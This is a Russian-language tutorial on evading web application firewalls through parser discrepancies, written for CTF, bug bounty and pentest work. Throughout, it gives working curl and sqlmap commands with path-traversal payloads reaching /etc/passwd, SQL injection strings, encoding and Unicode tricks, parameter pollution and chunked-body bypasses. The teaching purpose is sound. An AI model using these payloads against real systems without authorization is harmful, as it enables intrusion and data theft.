Обход WAF (Web Application Firewall) и фильтров ввода — навык, который отличает «инъекция не проходит» от «инъекция работает». Ключевая идея: **WAF и защищаемое приложение — это два разных парсера**. Если они по-разному понимают один и тот же байтовый поток, появляется зазор, в который проскакивает payload: WAF видит «безобидную» строку, а приложение исполняет вредоносную. Все техники обхода — это поиск и эксплуатация таких расхождений.

## Теория: почему обход вообще возможен

WAF нормализует запрос, чтобы сравнить с сигнатурами. Приложение — тоже нормализует, но иначе. Расхождения возникают на всех уровнях:

1. **Кодирование.** WAF декодирует URL-encode один раз, приложение — дважды (double encoding). `%252e%252e%252f` → WAF видит `%2e%2e%2f`, приложение — `../`.
2. **Юникод/нормализация.** `%c0%ae` (overlong UTF-8) может декодироваться приложением как `.`.
3. **Разбор заголовков/тела.** Разная трактовка `Content-Length`/`Transfer-Encoding` → request smuggling.
4. **Параметры.** HTTP Parameter Pollution: WAF смотрит на первое значение, приложение — на второе.
5. **Метод/маршрут.** WAF может проверять только `GET`, а приложение принимает тот же параметр в `POST`/JSON.
6. **Фрагментация.** Разбиение payload между несколькими параметрами/запросами.

Чем сложнее стек (CDN → reverse proxy → app server → framework), тем больше парсеров и тем больше зазоров.

## Инструменты: wafw00f, sqlmap tamper, ручные повторы

| Инструмент | Назначение |
|-----------|------------|
| `wafw00f` | определить наличие и тип WAF |
| `sqlmap --tamper` | готовые мутации payload |
| Burp Repeater | ручной подбор обхода |
| `ffuf` | фаззинг кодировок/разделителей |
| `nmap --script http-waf-detect` | быстрый детект WAF |

```bash
# какой WAF стоит
wafw00f https://app.example/
# sqlmap с мутациями под WAF
sqlmap -r req.txt --tamper=space2comment,randomcase,between --batch --dbs
# список tamper-скриптов
ls /usr/share/sqlmap/tamper/
```

Часто используемые tamper: `space2comment` (пробел → `/**/`), `space2hash`, `randomcase` (смена регистра), `between` (`>` → `NOT BETWEEN`), `charencode`, `base64encode`, `unicodeescape`, `apostrophemask` (кавычка → `%EF%BC%87`).

## Разобранный пример: обход фильтра, запрещающего `../` и пробелы

Дано: приложение принимает `?file=...`, WAF блокирует подстроку `../` и пробелы.

```bash
# базовый (блокируется)
curl -s 'https://t/?file=../../etc/passwd'
# 1. URL-encode
curl -s 'https://t/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd'
# 2. double encoding
curl -s 'https://t/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
# 3. overlong / unicode
curl -s 'https://t/?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
# 4. обход нормализации пути (приложение схлопывает ....//)
curl -s 'https://t/?file=....//....//etc/passwd'
# 5. обход через backslash (Windows)
curl -s 'https://t/?file=..%5c..%5cwindows%5cwin.ini'
```

Какая из строк сработает — зависит от того, где именно нормализует WAF и где приложение. Перебирайте варианты по одному и смотрите на разницу (403 WAF vs 200/500 приложения).

## Расхождения парсеров: шпаргалка

| Техника | Как работает | Пример |
|---------|--------------|--------|
| Double encoding | WAF декодирует 1 раз, app — 2 | `%252e%252e%252f` |
| Overlong UTF-8 | app декодирует неканонический юникод | `%c0%ae%c0%ae/` |
| Parameter pollution | WAF читает первое, app — последнее | `?id=1&id=2` |
| Метод-обход | WAF проверяет только GET | тот же param в POST |
| Content-Type обход | WAF парсит только form | JSON/multipart тело |
| Chunked encoding | WAF не собирает chunks | `Transfer-Encoding: chunked` |
| Smuggling | расхождение CL/TE между прокси и app | `web-request-smuggling` |
| Case/comment | сигнатура регистрозависима | `UnIoN/**/SeLeCt` |
| Фрагментация | payload разбит между параметрами | `a=SEL&b=ECT` |
| Whitespace | пробел → `%09`/`%0a`/`/**/` | `UNION%0aSELECT` |

## HTTP Parameter Pollution для WAF

Если WAF берёт **первое** значение параметра, а приложение — **последнее** (или наоборот), можно «спрятать» payload:

```bash
# WAF видит id=1 (чисто), app использует id=1' OR 1=1-- -
curl -s 'https://t/item?id=1&id=1%27%20OR%201%3D1--%20-'
```

Разные фреймворки по-разному собирают дубликаты параметров (PHP берёт последнее, ASP.NET — конкатенацию через запятую, Node — массив). Это и есть зазор.

## Обход через Transfer-Encoding: chunked

Некоторые WAF не декодируют chunked-тело, пропуская его «как есть», а приложение собирает и исполняет:

```bash
curl -s https://t/ -H 'Transfer-Encoding: chunked' --data-binary $'1c\r\nid=1 UNION SELECT 1,2,3-- -\r\n0\r\n\r\n'
```

Здесь `1c` — длина chunk в hex. WAF видит непонятный поток, app — нормальный запрос. Это тот же класс, что request smuggling.

## Разобранный пример: определение WAF и слепой подбор

```bash
# 1. детект
wafw00f https://app.example/ -a
# 2. отправляем заведомо «плохой» запрос -> видим блок
curl -s -o /dev/null -w '%{http_code}\n' "https://app.example/?q=<script>"
#   403 -> WAF есть
# 3. подбираем обход инкрементально
curl -s -o /dev/null -w '%{http_code}\n' "https://app.example/?q=%3Cscript%3E"
curl -s -o /dev/null -w '%{http_code}\n' "https://app.example/?q=%253Cscript%253E"
# сравниваем: где 403 (WAF), где 200/500 (приложение)
```

Логика: «плохой» запрос → 403; «обошедший» → код приложения. Так находится рабочая кодировка.

## Типичные ошибки новичков

- **Сдаваться после первого 403.** Нужен перебор кодировок/разделителей.
- **Не определить WAF.** Без понимания продукта подбор слепой.
- **Путать блок WAF и ошибку приложения.** Смотрите на код и тело: 403 с брендингом WAF ≠ 500 от приложения.
- **Использовать только URL-encode.** Часто нужен double/unicode/chunked.
- **Забыть про заголовки.** WAF может не проверять `X-Forwarded-For`/кастомные заголовки.
- **Ломать прод.** Некоторые обходы (smuggling) могут ломать соединения — осторожно.

## Разобранный пример: обход через Unicode-нормализацию

WAF и приложение могут по-разному нормализовать Unicode. Если приложение декодирует неканонические последовательности, а WAF — нет, payload проскакивает:

```bash
# fullwidth-символы (NFKC-нормализация приложением)
# 'ＡＮＤ' (fullwidth) -> 'AND' после NFKC
curl -s 'https://t/?id=1 ＡＮＤ 1=1'
# overlong UTF-8 для '.' и '/'
curl -s 'https://t/?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
# идеографические точки (U+3002) -> '.'
curl -s 'https://t/?file=。。/。。/etc/passwd'
```

Если приложение делает NFKC/NFC-нормализацию, а WAF — нет (или наоборот), возникает зазор. Это частый источник обхода на CDN с агрессивной нормализацией.

## Разобранный пример: обход через разные Content-Type

WAF часто парсит только `application/x-www-form-urlencoded`. Тот же payload в JSON или multipart может пройти мимо:

```bash
# form (может блокироваться)
curl -s https://t/search -d 'q=1 UNION SELECT 1,2,3-- -'
# JSON (WAF не парсит тело)
curl -s https://t/search -H 'Content-Type: application/json' -d '{"q":"1 UNION SELECT 1,2,3-- -"}'
# multipart
curl -s https://t/search -F 'q=1 UNION SELECT 1,2,3-- -'
```

Приём работает, когда фронтенд-прокси не умеет разбирать нестандартный Content-Type и просто пропускает тело.

## Разобранный пример: обход через заголовки

Некоторые WAF не инспектируют определённые заголовки, а приложение их использует (или наоборот):

```bash
# параметр в cookie
curl -s https://t/ -H 'Cookie: q=1 UNION SELECT 1,2,3-- -'
# параметр в кастомном заголовке
curl -s https://t/ -H 'X-Query: 1 UNION SELECT 1,2,3-- -'
# очень длинный заголовок, чтобы «сбить» парсер WAF
curl -s https://t/ -H "X-Pad: $(python3 -c 'print("A"*8000)')" -d 'q=payload'
```

Последний приём — «buffer overflow» для WAF: превышение лимита заголовка заставляет его пропустить проверку тела.

## Инструменты глубоко

**wafw00f** — пассивный и активный детект:

```bash
wafw00f https://app.example/ -a -v      # -a: все тесты, -v: подробно
```

**sqlmap tamper** — цепочки мутаций (порядок важен):

```bash
# комбинированные tamper для агрессивного WAF
sqlmap -r req.txt --tamper=between,randomcase,space2comment,charencode --batch
# список с описанием
python3 -c "import os;print('\n'.join(sorted(os.listdir('/usr/share/sqlmap/tamper'))))"
```

**Burp Intruder** — ручной перебор: составьте список кодировок и прогоняйте один и тот же payload, отмечая, где WAF вернул 403, а приложение — свой код.

## Чек-лист обхода WAF

1. Определите WAF (`wafw00f`, заголовки ответа, страница блокировки).
2. Поймите, **что** блокируется (подстрока, сигнатура, длина).
3. Составьте матрицу кодировок: url, double-url, unicode, overlong, hex, base64.
4. Составьте матрицу разделителей: `/**/`, `%09`, `%0a`, `%0d`, `+`, `()`.
5. Проверьте расхождения транспорта: HPP, chunked, CL/TE, h2c.
6. Попробуйте другой Content-Type/метод/заголовок.
7. Автоматизируйте `sqlmap --tamper` с комбинацией.
8. Зафиксируйте рабочую строку и переходите к эксплуатации.

## Где пригодится

- **CTF (Web):** WAF-челленджи — отдельный жанр; без обхода payload просто не дойдёт до уязвимости.
- **Bug bounty:** на реальных программах почти всегда стоит WAF; умение обойти его превращает «заблокировано» в валидный отчёт.
- **Пентест:** оценка эффективности WAF и фильтров — часть отчёта; обход демонстрирует реальный риск.
- **Работа (AppSec):** понимание расхождений парсеров критично при проектировании защит (нельзя полагаться только на WAF).
